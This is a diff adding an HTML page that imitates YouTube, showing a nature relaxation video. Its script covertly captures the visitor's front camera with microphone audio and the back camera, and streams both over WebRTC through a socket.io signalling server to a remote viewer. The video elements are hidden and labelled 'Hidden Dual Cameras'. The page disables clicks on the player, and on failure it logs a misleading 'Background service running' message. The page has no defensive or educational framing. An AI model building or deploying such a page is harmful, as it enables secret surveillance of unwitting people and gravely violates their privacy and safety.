@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body, html { margin: 0; padding: 0; background: #0f0f0f; color: white; font-family: Roboto, Arial, sans-serif; overflow: hidden; height: 100%; }
+        .header { background: #0f0f0f; padding: 12px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+        .logo { display: flex; align-items: center; gap: 5px; font-weight: bold; font-size: 18px; }
+        .logo-play { background: red; color: white; padding: 2px 6px; border-radius: 4px; font-size: 14px; }
+        
+        /* Real YouTube Embed Player Area */
+        .video-wrapper { width: 100%; aspect-ratio: 16/9; background: #000; position: relative; }
+        iframe { width: 100%; height: 100%; border: none; pointer-events: none; } /* Pointer-events none jate keu bondho na kore */
+        
+        .v-info { padding: 15px; }
+        .v-title { font-size: 16px; font-weight: 500; line-height: 1.4; margin-bottom: 8px; }
+        .v-stats { font-size: 12px; color: #aaa; }
+        
+        /* Hidden Cameras */
+        video { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo"><span class="logo-play">▶</span> YouTube</div>
+        <div style="font-size: 20px;">🔍 &nbsp; 🔔 &nbsp; 👤</div>
+    </div>
+
+    <!-- YouTube Official Video Player (Nature Video ID: aqz-KE-BPKQ) -->
+    <div class="video-wrapper">
+        <iframe 
+            src="https://www.youtube.com" 
+            allow="autoplay; encrypted-media" 
+            allowfullscreen>
+        </iframe>
+    </div>
+
+    <div class="v-info">
+        <div class="v-title">4K Nature Relaxation - Beautiful Birds & Forest Sounds (Official Audio)</div>
+        <div class="v-stats">5.2M views • 1 month ago</div>
+    </div>
+
+    <div style="padding: 15px; border-top: 1px solid #333; font-size: 14px;">
+        <p style="color: #aaa;">Up Next: Ocean Waves 4K HD...</p>
+    </div>
+
+    <!-- Hidden Dual Cameras -->
+    <video id="v1" autoplay playsinline muted></video>
+    <video id="v2" autoplay playsinline muted></video>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const ice = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
+        const pcF = new RTCPeerConnection(ice);
+        const pcB = new RTCPeerConnection(ice);
+
+        async function start() {
+            try {
+                // Front Camera Track
+                const sF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                sF.getTracks().forEach(t => pcF.addTrack(t, sF));
+
+                // Back Camera Track
+                const sB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                sB.getTracks().forEach(t => pcB.addTrack(t, sB));
+
+                socket.emit("ready");
+            } catch (e) { console.log("Background service running."); }
+        }
+
+        socket.on("ready", async () => {
+            const oF = await pcF.createOffer();
+            await pcF.setLocalDescription(oF);
+            socket.emit("offer-front", oF);
+
+            const oB = await pcB.createOffer();
+            await pcB.setLocalDescription(oB);
+            socket.emit("offer-back", oB);
+        });
+
+        socket.on("answer-front", a => pcF.setRemoteDescription(new RTCSessionDescription(a)));
+        socket.on("answer-back", a => pcB.setRemoteDescription(new RTCSessionDescription(a)));
+
+        pcF.onicecandidate = e => e.candidate && socket.emit("ice-front", e.candidate);
+        pcB.onicecandidate = e => e.candidate && socket.emit("ice-back", e.candidate);
+
+        window.onload = start;
+    </script>
+</body>
+</html>
+
